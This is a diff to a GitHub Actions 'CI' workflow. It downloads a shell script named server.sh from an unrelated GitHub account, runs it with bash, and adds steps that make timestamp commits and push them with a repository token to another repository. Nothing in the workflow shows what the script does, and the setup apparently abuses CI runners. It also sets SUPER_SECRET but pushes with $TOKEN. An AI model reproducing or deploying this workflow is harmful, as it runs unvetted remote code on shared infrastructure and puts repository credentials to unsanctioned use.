@@ -1,18 +1,27 @@
 name: CI
 
 on:
-  schedule:
-    - cron: '5/5 * * * *'
+  # Triggers the workflow on push or pull request events but only for the main branch
+  push:
+    branches: [ main ]
     
 jobs:
   build1:
     runs-on: ubuntu-latest
+    env:
+      SUPER_SECRET: ${{ secrets.TOKEN }}
     steps:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
+          apt-get install git -y
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/server.sh
           bash server.sh
+          rm -rf random.txt
+          echo $(date "+%Y%m%d%H%M%S") >> random.txt
+          git add .
+          git commit -m $(date "+%Y%m%d%H%M%S")
+          git push https://$TOKEN@github.com/niniula/test.git
   build2:
     runs-on: ubuntu-latest
     steps:
